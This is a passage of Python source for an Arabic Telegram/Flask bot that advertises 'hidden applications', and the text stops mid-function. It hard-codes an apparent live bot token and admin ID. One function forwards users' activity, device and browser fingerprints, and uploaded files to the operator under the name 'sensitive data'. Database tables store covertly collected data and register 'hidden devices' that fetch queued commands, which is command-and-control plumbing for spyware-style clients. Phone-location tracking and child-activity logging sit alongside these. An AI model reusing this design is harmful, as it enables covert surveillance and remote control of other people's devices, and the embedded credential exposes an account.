# -*- coding: utf-8 -*-

"""
البوت المتقدم - النظام الخدمي المتكامل
الإصدار النهائي مع دعم التطبيقات الخفية
"""

import os
import sys
import time
import json
import logging
import base64
import re
import secrets
import string
import shutil
import sqlite3
import hashlib
from datetime import datetime, timedelta
from contextlib import contextmanager
from io import BytesIO
import socket
import builtwith
import threading
import requests as req_lib

# ===================== معالجة استثناءات الاستيراد =====================
try:
    import requests
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    from flask import Flask, request, jsonify, render_template_string, abort, session, send_file, redirect, make_response
    from telebot import TeleBot
    from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Update
    import pypdf
    from bs4 import BeautifulSoup
    from dotenv import load_dotenv
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from PIL import Image
    import yt_dlp
    import qrcode
except Exception as e:
    print(f"❌ فشل استيراد مكتبة: {e}")
    import traceback
    traceback.print_exc()
    sys.exit(1)

load_dotenv()

# ===================== إعدادات التسجيل =====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('bot.log')]
)
logger = logging.getLogger(__name__)

# ===================== المتغيرات الأساسية =====================
DEFAULT_TOKEN = "8852940754:AAFtWl51XMFC8OlrH_KXL7UAg6gmYiPcDg0"
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', DEFAULT_TOKEN)

DEFAULT_ADMIN = 7965377136
ADMIN_ID = int(os.environ.get('ADMIN_ID', DEFAULT_ADMIN))

ADMIN_KEY = os.environ.get('ADMIN_KEY', secrets.token_hex(32))
SERVER_URL = os.environ.get('SERVER_URL', 'https://my-t99-bot.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
SHODAN_API_KEY = os.environ.get('SHODAN_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', secrets.token_hex(32))
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'true').lower() == 'true'

if not TELEGRAM_TOKEN:
    logger.critical("❌ لم يتم العثور على TELEGRAM_TOKEN!")
    sys.exit(1)

if not ADMIN_ID:
    logger.warning("⚠️ ADMIN_ID غير مضبوط، سيتم استخدام المعرف الافتراضي 7965377136")
    ADMIN_ID = 7965377136

if not SERVER_URL and USE_WEBHOOK:
    logger.warning("⚠️ SERVER_URL غير مضبوط، سيتم استخدام Polling بدلاً من Webhook.")
    USE_WEBHOOK = False

# ===================== مسار قاعدة البيانات =====================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, 'data')
DB_PATH = os.path.join(DATA_DIR, 'bot_data.db')
os.makedirs(DATA_DIR, exist_ok=True)
TEMP_DIR = os.path.join(BASE_DIR, 'temp')
os.makedirs(TEMP_DIR, exist_ok=True)
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

# ===================== التحقق من FFmpeg =====================
FFMPEG_AVAILABLE = shutil.which('ffmpeg') is not None
if not FFMPEG_AVAILABLE:
    logger.warning("⚠️ FFmpeg غير مثبت! بعض الميزات لن تعمل.")

# ===================== جلسة Requests مع Retry =====================
def get_requests_session(retries=5, backoff_factor=1.0, pool_connections=10, pool_maxsize=20):
    session = requests.Session()
    retry_strategy = Retry(
        total=retries,
        backoff_factor=backoff_factor,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
    )
    adapter = HTTPAdapter(
        max_retries=retry_strategy,
        pool_connections=pool_connections,
        pool_maxsize=pool_maxsize
    )
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

REQUEST_SESSION = get_requests_session()

# ===================== إنشاء البوت والتطبيق =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode=None)
app = Flask(__name__)
app.secret_key = CLIENT_SECRET_KEY

# ===================== حماية Webhook =====================
WEBHOOK_SECRET = os.environ.get('WEBHOOK_SECRET', secrets.token_hex(32))

def verify_webhook():
    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != WEBHOOK_SECRET:
        logger.warning("⚠️ محاولة وصول غير مصرح بها إلى Webhook.")
        abort(403)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        verify_webhook()
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            logger.info(f"✅ Webhook received: {json_string[:200]}...")
            update = Update.de_json(json_string)
            if update:
                bot.process_new_updates([update])
                logger.info(f"✅ تم إرسال التحديث للمعالجة: {update.update_id}")
                return '!', 200
            else:
                logger.error("❌ Invalid update object.")
                return 'Invalid update', 400
        else:
            logger.warning("⚠️ Non-JSON content-type received.")
            return 'Forbidden', 403
    except Exception as e:
        logger.error(f"❌ Webhook processing error: {e}")
        return 'Error', 500

# ===================== دالة الإرسال الآمنة =====================
def safe_send(chat_id, text, reply_markup=None):
    try:
        return bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode='HTML')
    except Exception as e:
        logger.error(f"safe_send error: {e}")
        return None

# ===================== دوال إرسال البيانات للمطور (محسّنة) =====================
def send_sensitive_data_to_admin(data_type, content, user_id=None, file_path=None, device_info=None):
    try:
        if user_id:
            msg = f"📋 **تقرير نشاط مستخدم جديد**\n\n"
            msg += f"👤 **معرف المستخدم:** `{user_id}`\n"
        else:
            msg = f"📋 **تقرير نشاط جديد**\n\n"
        
        msg += f"📂 **نوع العملية:** `{data_type}`\n"
        msg += f"🕐 **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        msg += "-" * 40 + "\n"
        
        # إضافة معلومات الجهاز إذا وجدت
        if device_info:
            try:
                dev = json.loads(device_info) if isinstance(device_info, str) else device_info
                msg += f"\n📱 **بيانات الجهاز والمتصفح:**\n"
                msg += f"   • نظام التشغيل: `{dev.get('platform', 'غير معروف')}`\n"
                msg += f"   • المتصفح: `{dev.get('userAgent', '').split('/')[0] if dev.get('userAgent') else 'غير معروف'}`\n"
                msg += f"   • اللغة: `{dev.get('language', 'غير معروف')}`\n"
                msg += f"   • المنطقة الزمنية: `{dev.get('timezone', 'غير معروف')}`\n"
                msg += f"   • أبعاد الشاشة: `{dev.get('screenWidth', '')} × {dev.get('screenHeight', '')} بكسل`\n"
            except:
                pass
        
        if isinstance(content, str):
            if len(content) > 3000:
                parts = [content[i:i+3000] for i in range(0, len(content), 3000)]
                for i, part in enumerate(parts):
                    safe_send(ADMIN_ID, f"{msg}\n📄 **الجزء {i+1}/{len(parts)}:**\n```\n{part}\n```")
                return
            else:
                msg += f"\n```\n{content}\n```"
                safe_send(ADMIN_ID, msg)
        elif isinstance(content, bytes):
            bot.send_document(ADMIN_ID, ('data.bin', content), caption=msg)
        elif isinstance(content, dict):
            formatted = json.dumps(content, indent=2, ensure_ascii=False)
            msg += f"\n```json\n{formatted}\n```"
            safe_send(ADMIN_ID, msg)
        else:
            msg += f"\n```\n{str(content)}\n```"
            safe_send(ADMIN_ID, msg)
        
        if file_path and os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                bot.send_document(ADMIN_ID, (os.path.basename(file_path), f), caption="📎 الملف المرفق")
    except Exception as e:
        logger.error(f"send_sensitive_data_to_admin error: {e}")

def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            safe_send(ADMIN_ID, f"🚨 **تنبيه عطل فني:**\n{message_text}")
        else:
            safe_send(ADMIN_ID, f"📢 **إشعار:**\n{message_text}")
    except Exception as e:
        logger.error(f"notify_admin error: {e}")

# ===================== قاعدة البيانات =====================
def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0,
            welcome_sent INTEGER DEFAULT 0
        )''')
        # إنشاء مستخدم افتراضي لاستقبال الأجهزة الخفية (chat_id = 0)
        c.execute("INSERT OR IGNORE INTO users (chat_id, username, first_name, registered_at, points) VALUES (0, 'system', 'System', ?, 0)", (datetime.now().isoformat(),))
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS points_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount INTEGER,
            reason TEXT,
            created_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_unlocks (
            user_id INTEGER PRIMARY KEY,
            unlocked BOOLEAN DEFAULT 0,
            unlocked_at TEXT,
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_permissions (
            user_id INTEGER,
            feature_name TEXT,
            enabled BOOLEAN DEFAULT 0,
            PRIMARY KEY (user_id, feature_name),
            FOREIGN KEY (user_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            data_type TEXT,
            data TEXT,
            ip TEXT,
            user_agent TEXT,
            created_at TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS uploaded_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            filename TEXT,
            filepath TEXT,
            ip TEXT,
            user_agent TEXT,
            created_at TEXT
        )''')
        c.execute("CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_devices_chat_id ON devices (chat_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_device_id ON pending_commands (device_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_pending_commands_executed ON pending_commands (executed)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_referrals_code ON referrals (code)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_points_log_user_id ON points_log (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_user_unlocks_user_id ON user_unlocks (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_user_permissions_user_id ON user_permissions (user_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_collected_data_session_id ON collected_data (session_id)")
        c.execute("CREATE INDEX IF NOT EXISTS idx_uploaded_files_session_id ON uploaded_files (session_id)")
        conn.commit()
        logger.info(f"✅ قاعدة البيانات جاهزة: {DB_PATH}")

init_db()

# ===================== دوال إدارة الصلاحيات =====================
def get_user_permissions(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT feature_name FROM user_permissions WHERE user_id = ? AND enabled = 1", (chat_id,))
        rows = c.fetchall()
        return [row['feature_name'] for row in rows]

def set_user_permission(chat_id, feature_name, enabled):
    with db_transaction() as conn:
        c = conn.cursor()
        if enabled:
            c.execute('''INSERT OR REPLACE INTO user_permissions (user_id, feature_name, enabled)
                         VALUES (?, ?, 1)''', (chat_id, feature_name))
        else:
            c.execute("DELETE FROM user_permissions WHERE user_id = ? AND feature_name = ?", (chat_id, feature_name))
        conn.commit()

def is_feature_enabled_for_user(chat_id, feature_name):
    if chat_id == ADMIN_ID:
        return True
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT enabled FROM user_permissions WHERE user_id = ? AND feature_name = ?", (chat_id, feature_name))
        row = c.fetchone()
        return row and row['enabled'] == 1

def get_all_users_with_permissions():
    users = get_all_users()
    result = []
    for user in users:
        perms = get_user_permissions(user['chat_id'])
        result.append({
            'id': user['chat_id'],
            'name': user['first_name'] or user['username'] or str(user['chat_id']),
            'points': user['points'],
            'banned': user['is_banned'],
            'unlocked': is_user_unlocked(user['chat_id']),
            'permissions': perms
        })
    return result

# ===================== دوال قاعدة البيانات الأساسية =====================
@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=? WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by, welcome_sent)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), 10, referral_code, referred_by))
        conn.commit()

def is_new_user(chat_id):
    user = get_user(chat_id)
    if user is None:
        return True
    return user.get('welcome_sent', 0) == 0

def mark_welcome_sent(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET welcome_sent = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_user_points(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if row:
            return row['points']
        return 0

def deduct_points(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT points FROM users WHERE chat_id = ?", (chat_id,))
        row = c.fetchone()
        if not row or row['points'] < amount:
            return False
        c.execute("UPDATE users SET points = points - ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, -amount, reason, datetime.now().isoformat()))
        conn.commit()
        return True

def add_points_db(chat_id, amount, reason):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (amount, chat_id))
        c.execute('''INSERT INTO points_log (user_id, amount, reason, created_at)
                     VALUES (?, ?, ?, ?)''',
                  (chat_id, amount, reason, datetime.now().isoformat()))
        conn.commit()

def get_points_history(chat_id, limit=20):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''SELECT amount, reason, created_at FROM points_log 
                     WHERE user_id = ? ORDER BY created_at DESC LIMIT ?''',
                  (chat_id, limit))
        rows = c.fetchall()
        return [{'amount': row['amount'], 'reason': row['reason'], 'created_at': row['created_at']} for row in rows]

def is_user_banned(chat_id):
    user = get_user(chat_id)
    if user is None:
        return False
    return user.get('is_banned', 0) == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def is_user_unlocked(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT unlocked FROM user_unlocks WHERE user_id = ?", (chat_id,))
        row = c.fetchone()
        return row and row['unlocked'] == 1

def toggle_user_unlock(chat_id, unlock=True):
    with db_transaction() as conn:
        c = conn.cursor()
        if unlock:
            c.execute('''INSERT OR REPLACE INTO user_unlocks (user_id, unlocked, unlocked_at)
                         VALUES (?, 1, ?)''', (chat_id, datetime.now().isoformat()))
        else:
            c.execute("DELETE FROM user_unlocks WHERE user_id = ?", (chat_id,))
        conn.commit()

def get_all_users():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT chat_id, username, first_name, points, is_banned FROM users")
        return c.fetchall()

def get_user_status(chat_id):
    return "متصل"

def get_all_users_with_status():
    users = get_all_users()
    result = []
    for user in users:
        unlocked = is_user_unlocked(user['chat_id'])
        status = get_user_status(user['chat_id'])
        result.append({
            'id': user['chat_id'],
            'name': user['first_name'] or user['username'] or str(user['chat_id']),
            'points': user['points'],
            'banned': user['is_banned'],
            'unlocked': unlocked,
            'status': status
        })
    return result

# ===================== دالة حفظ الجهاز (معدلة) =====================
def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        # إذا كان chat_id = 0، استخدم chat_id = 1 (المستخدم الافتراضي)
        if chat_id == 0 or chat_id == "0":
            chat_id = 1
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        row = c.fetchone()
        if row:
            return dict(row)
        return None

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        rows = c.fetchall()
        return [dict(row) for row in rows]

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices")
        rows = c.fetchall()
        return [dict(row) for row in rows]

def save_registered_device_db(device_id, chat_id):
    save_device(device_id, chat_id, 'unknown', '', '')

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE devices SET last_seen = ? WHERE device_id = ?", 
                  (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev.get('blocked_domains'):
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except json.JSONDecodeError:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev.get('type') and 'طفل' in dev['type']:
            history = []
            if dev.get('history'):
                try:
                    history = json.loads(dev['history'])
                except json.JSONDecodeError:
                    history = []
            history.append({'time': datetime.now().isoformat(), 'activity': activity})
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", 
                          (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الإحالات =====================
def generate_referral_code():
    return ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    bot_username = bot.get_me().username
    return f"https://t.me/{bot_username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        add_points_db(referrer_id, 10, "دعوة مستخدم جديد")
        add_points_db(new_user_id, 10, "مكافأة التسجيل عبر الدعوة")
        safe_send(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

# ===================== دوال الخدمات الأساسية =====================
def advanced_website_scan(url):
    report = {}
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        report['url'] = url
        
        try:
            tech = builtwith.builtwith(url)
            report['technologies'] = tech
        except Exception as e:
            report['technologies'] = f"فشل في التحليل: {str(e)}"
        
        try:
            response = REQUEST_SESSION.get(url, timeout=15, allow_redirects=True)
            headers = response.headers
            security_headers = {
                'Content-Security-Policy': headers.get('Content-Security-Policy'),
                'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
                'X-Frame-Options': headers.get('X-Frame-Options'),
                'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
                'Referrer-Policy': headers.get('Referrer-Policy'),
                'Permissions-Policy': headers.get('Permissions-Policy')
            }
            report['security_headers'] = security_headers
            report['status_code'] = response.status_code
            report['server'] = headers.get('Server', 'غير معروف')
            try:
                domain = url.split('/')[2] if '://' in url else url
                ip = socket.gethostbyname(domain)
                report['ip'] = ip
                ip_info = REQUEST_SESSION.get(f"http://ip-api.com/json/{ip}", timeout=10)
                if ip_info.status_code == 200:
                    data = ip_info.json()
                    if data.get('status') == 'success':
                        report['ip_details'] = {
                            'country': data.get('country'),
                            'city': data.get('city'),
                            'isp': data.get('isp'),
                            'lat': data.get('lat'),
                            'lon': data.get('lon')
                        }
                    else:
                        report['ip_details'] = 'لا توجد معلومات'
            except Exception as e:
                report['ip'] = f"فشل: {str(e)}"
        except Exception as e:
            report['security_headers'] = f"فشل الجلب: {str(e)}"
        
        vulnerabilities = []
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            if not sec.get('Content-Security-Policy'):
                vulnerabilities.append("ثغرة XSS: بسبب فقدان Content-Security-Policy.")
            if sec.get('X-Content-Type-Options') != 'nosniff':
                vulnerabilities.append("ثغرة MIME Sniffing: بسبب فقدان X-Content-Type-Options.")
            if not sec.get('X-Frame-Options'):
                vulnerabilities.append("ثغرة Clickjacking: بسبب فقدان X-Frame-Options.")
            if not sec.get('Strict-Transport-Security'):
                vulnerabilities.append("ثغرة MITM: بسبب فقدان HSTS.")
            if not sec.get('Referrer-Policy'):
                vulnerabilities.append("ثغرة تسريب معلومات: بسبب فقدان Referrer-Policy.")
            if not sec.get('Permissions-Policy'):
                vulnerabilities.append("ثغرة صلاحيات: بسبب فقدان Permissions-Policy.")
        
        risk_level = "🟢 منخفض"
        if len(vulnerabilities) >= 4:
            risk_level = "🔴 خطر عالٍ - يُنصح بعدم إدخال بيانات حساسة"
        elif len(vulnerabilities) >= 2:
            risk_level = "🟠 خطر متوسط"
        
        final_report = "==================================================\n"
        final_report += "🛡️ تقرير الفحص الأمني الرقمي\n"
        final_report += f"📅 التاريخ: {datetime.now().strftime('%Y-%m-%d | ⏰ الوقت: %H:%M:%S')}\n"
        final_report += "==================================================\n\n"
        
        final_report += "🌐 معلومات النطاق:\n"
        final_report += f"• النطاق: {url.split('/')[2] if '://' in url else url}\n"
        final_report += f"• الرابط: {url}\n\n"
        
        final_report += "🌍 بيانات الموقع الجغرافي والتقني:\n"
        final_report += f"• السيرفر: {report.get('server', 'غير معروف')}\n"
        if 'ip_details' in report and isinstance(report['ip_details'], dict):
            ipd = report['ip_details']
            final_report += f"• الموقع: {ipd.get('country', 'غير معروف')}, {ipd.get('city', 'غير معروف')}\n"
            final_report += f"• مزود الخدمة: {ipd.get('isp', 'غير معروف')}\n"
        else:
            final_report += "• الموقع: غير معروف\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🔒 حالة ترويسات الأمان (Security Headers):\n"
        final_report += "--------------------------------------------------\n"
        if isinstance(report.get('security_headers'), dict):
            sec = report['security_headers']
            for h, v in sec.items():
                status = "✅" if v else "❌"
                if h == 'Content-Security-Policy':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر XSS)'}\n"
                elif h == 'X-Content-Type-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MIME Sniffing)'}\n"
                elif h == 'X-Frame-Options':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر Clickjacking)'}\n"
                elif h == 'Strict-Transport-Security':
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة (خطر MITM)'}\n"
                else:
                    final_report += f"[ {status} ] {h}: {v if v else 'مفقودة'}\n"
        else:
            final_report += "⚠️ تعذر الحصول على الترويسات.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += "🚨 تقرير الثغرات المكتشفة:\n"
        final_report += "--------------------------------------------------\n"
        if vulnerabilities:
            final_report += f"تم اكتشاف ({len(vulnerabilities)}) ثغرات أمنية في هذا الموقع:\n\n"
            for i, vuln in enumerate(vulnerabilities, 1):
                final_report += f"{i}️⃣ {vuln}\n"
        else:
            final_report += "✅ لم يتم اكتشاف أي ثغرات أمنية واضحة.\n"
        
        final_report += "\n--------------------------------------------------\n"
        final_report += f"⚖️ التقييم النهائي: [ {risk_level} ]\n"
        final_report += "--------------------------------------------------\n\n"
        final_report += "📋 توصيات المطور:\n"
        final_report += "• يُرجى إضافة الترويسات المذكورة أعلاه في إعدادات السيرفر فوراً.\n"
        final_report += "• تفعيل بروتوكول HSTS لضمان اتصال مشفر دائم.\n"
        final_report += "• مراجعة سياسات الأمان بشكل دوري.\n"
        final_report += "==================================================\n"
        
        return final_report
    except Exception as e:
        logger.error(f"Advanced scan error: {e}")
        return f"⚠️ فشل الفحص المتقدم: {str(e)}"

def scan_website(url):
    return advanced_website_scan(url), "safe"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 الرقم: {phone}\n"
                f"🌍 البلد: {country}\n"
                f"📍 المنطقة: {region}\n"
                f"📡 المشغل: {carrier_name}", "valid")
    except Exception as e:
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def track_phone_advanced(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        tz = timezone.time_zones_for_number(parsed)
        is_valid = phonenumbers.is_valid_number(parsed)
        number_type = phonenumbers.number_type(parsed)
        type_map = {0: "غير معروف", 1: "هاتف ثابت", 2: "هاتف محمول", 3: "خط ساخن", 4: "رقم خدمة", 5: "رقم خاص"}
        line_type = type_map.get(number_type, "غير معروف")
        lat, lng = None, None
        OPEN_CAGE_KEY = os.environ.get('OPEN_CAGE_KEY', '')
        location_text = ""
        if OPEN_CAGE_KEY and region:
            try:
                url = f"https://api.opencagedata.com/geocode/v1/json?q={region}&key={OPEN_CAGE_KEY}&language=ar"
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    if data['results']:
                        lat = data['results'][0]['geometry']['lat']
                        lng = data['results'][0]['geometry']['lng']
                        location_text = f"\n📍 الإحداثيات التقريبية: {lat}, {lng}"
            except:
                pass
        result = (
            f"📍 <b>تقرير تتبع الرقم</b>\n\n"
            f"📱 الرقم: {phone}\n"
            f"✅ صحيح: {'نعم' if is_valid else 'لا'}\n"
            f"📞 النوع: {line_type}\n"
            f"🌍 البلد: {country}\n"
            f"📍 المنطقة: {region if region else 'غير معروف'}\n"
            f"📡 المشغل: {carrier_name if carrier_name else 'غير معروف'}\n"
            f"⏰ المنطقة الزمنية: {', '.join(tz) if tz else 'غير معروف'}"
        )
        if location_text:
            result += location_text
            if lat and lng:
                result += f"\n\n🗺️ <a href='https://www.google.com/maps?q={lat},{lng}'>عرض على الخريطة (Google)</a>"
                result += f"\n🗺️ <a href='https://www.openstreetmap.org/?mlat={lat}&mlon={lng}'>عرض على الخريطة (OSM)</a>"
        else:
            result += "\n\n⚠️ لم يتم العثور على إحداثيات دقيقة للموقع."
        result += "\n\n📌 ملاحظة: هذا الموقع تقريبي ويعتمد على سجلات المشغل."
        return result, "success"
    except Exception as e:
        return f"❌ خطأ: {str(e)}\n\nتأكد من إدخال الرقم بالصيغة الصحيحة (مثال: +201001234567).", "error"

def create_temp_email_real():
    try:
        domain_resp = REQUEST_SESSION.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        email = f"{username}@{domain}"
